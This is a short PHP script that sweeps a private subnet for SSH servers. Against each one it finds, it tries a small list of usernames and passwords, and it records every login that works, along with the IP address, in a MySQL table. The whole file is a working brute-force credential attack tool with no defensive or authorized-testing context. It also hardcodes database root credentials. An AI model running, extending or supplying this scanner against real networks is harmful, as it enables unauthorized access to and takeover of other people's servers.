<?php 
// connect to dataBase to stor userName,ipAddress and password
 $host="127.0.0.1";
 $usr="root";
  $pwd="mmagrounmahdi@gmail.com";
  $db='sec'; 
    $dsn ='mysql:host='.$host.';dbname='.$db.';charset=utf8';
    try{
   $connection= new PDO($dsn, $usr,$pwd, 
    array(PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION));
    }
    catch(PDOException $e){
        echo 'connection error';
    }
    
$userNames=["administrateur","user2","user3"]; 
$userPassword=["useradm","passw1","passw2"];

$ip="172.16.20.";

// reduce socket time to make it faster
$originalConnectionTimeout = ini_get('default_socket_timeout');
   ini_set('default_socket_timeout',3);
$j=0;
for($i=0;$i<254;$i++){
    $crrIp=$ip.$i;
    echo $crrIp;
    $conn = ssh2_connect($crrIp, 22);
    if($conn!=false){
    // iteration number 
    $irr=0;
    
    for($l=0;$l<count($userNames);$l++){ // loop on names 
    
        for($m=0;$m<count($userPassword);$m++){ // loop on passwords 

        if($irr==2){ // reconnect because there is a problem in ssh2_auth_password when lostConnection it after 4 iteration it give true 'unormal behavior' 
            $conn = ssh2_connect($crrIp, 22);
            $irr=0;
        }
    if (ssh2_auth_password($conn,$userNames[$l],$userPassword[$m])) { // verify connection 
        echo $userNames[$l]." : ".$userPassword[$m];
        $qr=$connection->prepare("insert into servers (username,userpassword,ip) values (?,?,?)");
         $qr->execute([$userNames[$l],$userPassword[$m],$crrIp]);
        $j=1;
        break;

    } 
    $irr++;
}
if($j==1) {
    $j=0;
    break;
}

}
    }
}

?>